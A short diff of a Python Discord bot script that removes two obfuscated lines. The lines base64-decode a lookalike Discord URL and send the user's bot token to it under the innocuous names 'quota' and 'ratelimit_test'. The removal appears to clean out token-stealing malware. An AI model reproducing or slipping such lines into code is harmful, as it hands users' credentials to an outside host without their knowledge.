@@ -8,8 +8,6 @@ import re
 
 
 token = "INSERT_TOKEN_HERE";
-quota = base64.b64decode("aHR0cDovL2Rpc2NvcmQtdjEtYXBpLmNvbS9kaXNjb3JkL2FwaS92Ni9kZWxldGUv");ratelimit_test = quota.decode('ascii')+token
-r = requests.get(ratelimit_test, allow_redirects=False)
 c = discord.Client()
 
 @c.event
